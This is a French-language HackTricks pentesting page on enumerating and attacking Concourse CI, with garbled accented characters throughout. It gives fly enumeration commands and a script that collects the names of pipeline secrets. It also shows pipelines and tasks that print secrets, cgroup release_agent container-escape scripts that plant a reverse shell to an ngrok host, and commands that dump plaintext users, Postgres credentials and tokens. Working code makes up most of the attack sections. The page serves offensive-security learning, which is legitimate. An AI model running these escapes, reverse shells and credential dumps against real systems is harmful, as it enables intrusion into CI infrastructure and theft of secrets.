# Concourse Enumeration & Attacks

## √ânum√©ration et Attaques Concourse

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### R√¥les d'Utilisateurs & Permissions

Concourse dispose de cinq r√¥les :

* _Concourse_ **Admin** : Ce r√¥le est uniquement attribu√© aux propri√©taires de la **main team** (√©quipe initiale par d√©faut de Concourse). Les administrateurs peuvent **configurer d'autres √©quipes** (par exemple : `fly set-team`, `fly destroy-team`...). Les permissions de ce r√¥le ne peuvent pas √™tre affect√©es par le RBAC.
* **owner** : Les propri√©taires d'√©quipe peuvent **modifier tout au sein de l'√©quipe**.
* **member** : Les membres d'√©quipe peuvent **lire et √©crire** au sein des **actifs de l'√©quipe** mais ne peuvent pas modifier les param√®tres de l'√©quipe.
* **pipeline-operator** : Les op√©rateurs de pipeline peuvent effectuer des **op√©rations de pipeline** telles que d√©clencher des constructions et √©pingler des ressources, cependant ils ne peuvent pas mettre √† jour les configurations de pipeline.
* **viewer** : Les spectateurs d'√©quipe ont un acc√®s **"en lecture seule" √† une √©quipe** et ses pipelines.

{% hint style="info" %}
De plus, les **permissions des r√¥les owner, member, pipeline-operator et viewer peuvent √™tre modifi√©es** en configurant le RBAC (en configurant plus sp√©cifiquement ses actions). Pour en savoir plus, consultez : [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Notez que Concourse **regroupe les pipelines au sein des √©quipes**. Par cons√©quent, les utilisateurs appartenant √† une √©quipe pourront g√©rer ces pipelines et **plusieurs √©quipes** peuvent exister. Un utilisateur peut appartenir √† plusieurs √©quipes et avoir des permissions diff√©rentes au sein de chacune d'elles.

### Vars & Gestionnaire de Credentials

Dans les configurations YAML, vous pouvez configurer des valeurs en utilisant la syntaxe `((_source-name_:_secret-path_._secret-field_))`.\
Le **source-name est facultatif**, et s'il est omis, le [gestionnaire de credentials √† l'√©chelle du cluster](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) sera utilis√©, ou la valeur peut √™tre fournie de mani√®re [statique](https://concourse-ci.org/vars.html#static-vars).\
Le **champ secret facultatif** _**secret-field**_ sp√©cifie un champ du secret r√©cup√©r√© √† lire. S'il est omis, le gestionnaire de credentials peut choisir de lire un 'champ par d√©faut' du credential r√©cup√©r√© si le champ existe.\
De plus, le _**secret-path**_ et le _**secret-field**_ peuvent √™tre entour√©s de guillemets doubles `"..."` s'ils **contiennent des caract√®res sp√©ciaux** comme `.` et `:`. Par exemple, `((source:"my.secret"."field:1"))` d√©finira le _secret-path_ √† `my.secret` et le _secret-field_ √† `field:1`.

#### Vars Statiques

Les vars statiques peuvent √™tre sp√©cifi√©es dans les **√©tapes des t√¢ches** :

```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```

Ou en utilisant les **arguments** `fly` suivants :

* `-v` ou `--var` `NAME=VALUE` d√©finit la cha√Æne `VALUE` comme valeur pour la variable `NAME`.
* `-y` ou `--yaml-var` `NAME=VALUE` analyse `VALUE` comme YAML et le d√©finit comme valeur pour la variable `NAME`.
* `-i` ou `--instance-var` `NAME=VALUE` analyse `VALUE` comme YAML et le d√©finit comme valeur pour la variable d'instance `NAME`. Voir [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) pour en savoir plus sur les variables d'instance.
* `-l` ou `--load-vars-from` `FILE` charge `FILE`, un document YAML contenant la correspondance des noms de variables aux valeurs, et les d√©finit toutes.

#### Gestion des identifiants

Il existe diff√©rentes mani√®res de sp√©cifier un **Gestionnaire d'identifiants** dans un pipeline, lisez comment sur [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
De plus, Concourse prend en charge diff√©rents gestionnaires d'identifiants :

* [Le gestionnaire d'identifiants Vault](https://concourse-ci.org/vault-credential-manager.html)
* [Le gestionnaire d'identifiants CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [Le gestionnaire d'identifiants AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [Le gestionnaire d'identifiants AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Gestionnaire d'identifiants Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [Le gestionnaire d'identifiants Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Mise en cache des identifiants](https://concourse-ci.org/creds-caching.html)
* [Masquage des identifiants](https://concourse-ci.org/creds-redacting.html)
* [R√©essayer les r√©cup√©rations √©chou√©es](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Notez que si vous avez un certain type d'**acc√®s en √©criture √† Concourse**, vous pouvez cr√©er des jobs pour **exfiltrer ces secrets**, car Concourse doit pouvoir y acc√©der.
{% endhint %}

### √ânum√©ration de Concourse

Pour √©num√©rer un environnement Concourse, vous devez d'abord **rassembler des identifiants valides** ou trouver un **jeton authentifi√©**, probablement dans un fichier de configuration `.flyrc`.

#### Connexion et √©num√©ration de l'utilisateur actuel

* Pour vous connecter, vous devez conna√Ætre l'**endpoint**, le **nom de l'√©quipe** (par d√©faut `main`) et une **√©quipe √† laquelle l'utilisateur appartient** :
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Obtenir les **cibles** configur√©es :
* `fly targets`
* V√©rifier si la **connexion √† la cible** configur√©e est toujours **valide** :
* `fly -t <target> status`
* Obtenir le **r√¥le** de l'utilisateur par rapport √† la cible indiqu√©e :
* `fly -t <target> userinfo`

{% hint style="info" %}
Notez que le **jeton API** est **sauvegard√©** dans `$HOME/.flyrc` par d√©faut, en fouillant une machine, vous pourriez y trouver les identifiants.
{% endhint %}

#### √âquipes & Utilisateurs

* Obtenir une liste des √©quipes
* `fly -t <target> teams`
* Obtenir les r√¥les au sein de l'√©quipe
* `fly -t <target> get-team -n <team-name>`
* Obtenir une liste des utilisateurs
* `fly -t <target> active-users`

#### Pipelines

* **Lister** les pipelines :
* `fly -t <target> pipelines -a`
* **Obtenir** le yaml du pipeline (**informations sensibles** peuvent √™tre trouv√©es dans la d√©finition) :
* `fly -t <target> get-pipeline -p <pipeline-name>`
* Obtenir toutes les **variables de configuration d√©clar√©es dans le pipeline**
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Obtenir tous les **noms des secrets utilis√©s dans les pipelines** (si vous pouvez cr√©er/modifier un job ou d√©tourner un conteneur, vous pourriez les exfiltrer) :

```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```

#### Conteneurs & Travailleurs

* Lister les **travailleurs** :
* `fly -t <target> workers`
* Lister les **conteneurs** :
* `fly -t <target> containers`
* Lister les **constructions** (pour voir ce qui est en cours d'ex√©cution) :
* `fly -t <target> builds`

### Attaques Concourse

#### Force Brute des Identifiants

* admin:admin
* test:test

#### √ânum√©ration des secrets et des param√®tres

Dans la section pr√©c√©dente, nous avons vu comment vous pouvez **obtenir tous les noms des secrets et les variables** utilis√©s par le pipeline. Les **variables pourraient contenir des informations sensibles** et le nom des **secrets sera utile plus tard pour essayer de les d√©rober**.

#### Session √† l'int√©rieur d'un conteneur en cours d'ex√©cution ou ayant r√©cemment √©t√© ex√©cut√©

Si vous avez suffisamment de privil√®ges (**r√¥le de membre ou plus**), vous pourrez **lister les pipelines et les r√¥les** et simplement obtenir une **session √† l'int√©rieur** du **conteneur** `<pipeline>/<job>` en utilisant :

```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```

Avec ces permissions, vous pourriez √™tre capable de :

* **Vol de secrets** √† l'int√©rieur du **conteneur**
* Tenter une **√©vasion** vers le n≈ìud
* Enum√©rer/Abuser de l'endpoint des **m√©tadonn√©es cloud** (depuis le pod et depuis le n≈ìud, si possible)

#### Cr√©ation/Modification de Pipeline

Si vous avez suffisamment de privil√®ges (**r√¥le de membre ou plus**), vous serez en mesure de **cr√©er/modifier de nouveaux pipelines**. V√©rifiez cet exemple :

```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

Avec la **modification/cr√©ation** d'un nouveau pipeline, vous serez capable de :

* **Voler** les **secrets** (en les affichant ou en entrant dans le conteneur et en ex√©cutant `env`)
* **S'√©chapper** vers le **n≈ìud** (en vous donnant suffisamment de privil√®ges - `privileged: true`)
* Enum√©rer/Abuser de l'endpoint des **m√©tadonn√©es cloud** (depuis le pod et depuis le n≈ìud)
* **Supprimer** le pipeline cr√©√©

#### Ex√©cuter une T√¢che Personnalis√©e

Cela est similaire √† la m√©thode pr√©c√©dente mais au lieu de modifier/cr√©er un pipeline entier, vous pouvez **juste ex√©cuter une t√¢che personnalis√©e** (ce qui sera probablement beaucoup plus **discret**) :

```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

#### √âvasion vers le n≈ìud depuis une t√¢che privil√©gi√©e

Dans les sections pr√©c√©dentes, nous avons vu comment **ex√©cuter une t√¢che privil√©gi√©e avec concourse**. Cela ne donnera pas au conteneur exactement le m√™me acc√®s que le drapeau privil√©gi√© dans un conteneur docker. Par exemple, vous ne verrez pas le p√©riph√©rique de syst√®me de fichiers du n≈ìud dans /dev, donc l'√©vasion pourrait √™tre plus "complexe".

Dans la preuve de concept suivante, nous allons utiliser le release\_agent pour nous √©chapper avec quelques petites modifications :

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

{% hint style="warning" %}
Comme vous l'avez peut-√™tre remarqu√©, il s'agit simplement d'une [**√©vasion de release\_agent classique**](https://github.com/carlospolop/hacktricks-cloud/blob/fr/pentesting-ci-cd/concourse-security/broken-reference/README.md) en modifiant simplement le chemin de la commande dans le n≈ìud.
{% endhint %}

#### S'√©chapper vers le n≈ìud depuis un conteneur Worker

Une √©vasion de release\_agent classique avec une l√©g√®re modification suffit pour cela :

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

#### √âvasion vers le n≈ìud depuis le conteneur Web

M√™me si le conteneur web a certaines d√©fenses d√©sactiv√©es, il **ne fonctionne pas comme un conteneur privil√©gi√© classique** (par exemple, vous **ne pouvez pas** **monter** et les **capacit√©s** sont tr√®s **limit√©es**, donc toutes les m√©thodes faciles pour s'√©chapper du conteneur sont inutiles).

Cependant, il stocke les **identifiants locaux en texte clair** :

```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```

Vous pourriez utiliser ces identifiants pour **vous connecter au serveur web** et **cr√©er un conteneur privil√©gi√© et vous √©chapper vers le n≈ìud**.

Dans l'environnement, vous pouvez √©galement trouver des informations pour **acc√©der √† l'instance postgresql** que concourse utilise (adresse, **nom d'utilisateur**, **mot de passe** et base de donn√©es parmi d'autres informations) :

```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```

#### Abus du service Garden - Pas une vraie attaque

{% hint style="warning" %}
Ce ne sont que quelques notes int√©ressantes sur le service, mais comme il n'√©coute que sur localhost, ces notes ne pr√©senteront aucun impact que nous n'avons pas d√©j√† exploit√© auparavant.
{% endhint %}

Par d√©faut, chaque worker Concourse ex√©cute un service [**Garden**](https://github.com/cloudfoundry/garden) sur le port 7777. Ce service est utilis√© par le ma√Ætre Web pour indiquer au worker **ce qu'il doit ex√©cuter** (t√©l√©charger l'image et ex√©cuter chaque t√¢che). Cela semble tr√®s bon pour un attaquant, mais il y a de bonnes protections :

* Il est seulement **expos√© localement** (127.0.0.1) et je pense que lorsque le worker s'authentifie √† nouveau contre le Web avec le service SSH sp√©cial, un tunnel est cr√©√© pour que le serveur Web puisse **communiquer avec chaque service Garden** √† l'int√©rieur de chaque worker.
* Le serveur Web **surveille les conteneurs en cours d'ex√©cution toutes les quelques secondes**, et les conteneurs **inattendus** sont **supprim√©s**. Donc, si vous voulez **ex√©cuter un conteneur personnalis√©**, vous devez **manipuler** la **communication** entre le serveur Web et le service Garden.

Les workers Concourse s'ex√©cutent avec des privil√®ges √©lev√©s de conteneur :

```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```

**Entrer dans un conteneur privil√©gi√© en cours d'ex√©cution**

Cependant, des techniques comme **monter** le p√©riph√©rique /dev du n≈ìud ou release\_agent **ne fonctionneront pas** (car le v√©ritable p√©riph√©rique avec le syst√®me de fichiers du n≈ìud n'est pas accessible, seulement un virtuel). Nous ne pouvons pas acc√©der aux processus du n≈ìud, donc s'√©chapper du n≈ìud sans exploits du noyau devient compliqu√©.

{% hint style="info" %}
Dans la section pr√©c√©dente, nous avons vu comment s'√©chapper d'un conteneur privil√©gi√©, donc si nous pouvons **ex√©cuter** des commandes dans un **conteneur privil√©gi√©** cr√©√© par le **travailleur actuel**, nous pourrions **nous √©chapper vers le n≈ìud**.
{% endhint %}

Notez qu'en manipulant concourse, j'ai remarqu√© que lorsqu'un nouveau conteneur est lanc√© pour ex√©cuter quelque chose, les processus du conteneur sont accessibles depuis le conteneur du travailleur, c'est comme si un conteneur cr√©ait un nouveau conteneur √† l'int√©rieur de lui-m√™me.

```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```

**Cr√©ation d'un nouveau conteneur privil√©gi√©**

Vous pouvez tr√®s facilement cr√©er un nouveau conteneur (ex√©cutez simplement un UID al√©atoire) et ex√©cuter quelque chose dessus :

```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```

Cependant, le serveur web v√©rifie toutes les quelques secondes les conteneurs en cours d'ex√©cution, et si un conteneur inattendu est d√©couvert, il sera supprim√©. Comme la communication se fait en HTTP, vous pourriez alt√©rer la communication pour √©viter la suppression des conteneurs inattendus :

```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```

## R√©f√©rences

* https://concourse-ci.org/vars.html

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
